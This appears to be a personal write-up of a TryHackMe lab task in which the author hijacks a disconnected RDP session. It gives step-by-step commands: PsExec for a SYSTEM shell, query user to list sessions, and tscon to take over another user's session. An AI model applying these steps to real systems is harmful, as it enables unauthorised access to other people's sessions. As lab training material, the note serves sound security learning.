---
title: 'Example Attack:'
updated: 2023-04-23T19:14:45.0000000+04:00
created: 2023-04-17T22:37:52.0000000+04:00
---

PM
To complete this exercise, you will need to connect to THMJMP2 using a new set of credentials obtained from <http://distributor.za.tryhackme.com/creds_t2> (Notice that this link is different from the other tasks). Once you have your credentials, connect to THMJMP2 via RDP:

- xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD

These credentials will grant you administrative access to THMJMP2.

For this task, we'll work on hijacking an RDP session. If you are interested in trying backdooring exe or other files, you can find some exercises about this in the Windows Local Persistence room.

Follow the instructions to hijack t1_toby.beck's RDP session on THMJMP2 to get your flag.

Note: When executing query session, you'll see several users named t1_toby.beck followed by a number. These are just identical copies of the same user, and you can hijack any of them (you don't need to hijack them all). Make sure you hijack a session marked as disconnected (Disc.) to avoid interfering with other users.

## Step 1: Connect to RDP Session

| Command | xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD |
|---------|--------------------------------------------------------------------|

![image1](image1-109.png)

## Step 2: Open CMD as Admin and Run PSESEC

| Commands | PsExec64.exe -s cmd.exe |
|----------|-------------------------|

![image2](image2-51.png)

![image3](image3-36.png)

## Step 3: List Out Exising sessions on a server

| Command | Query user |
|---------|------------|

![image4](image4-25.png)

## Step 4: Connecting to a Session

Based on the above, under STATE, we can see DISC, this means that a user has left a session open without logging out, we will take advantage and connect to that session with the following command:

| Command | tscon session_ID /dest:your_session_name |
|---------|------------------------------------------|

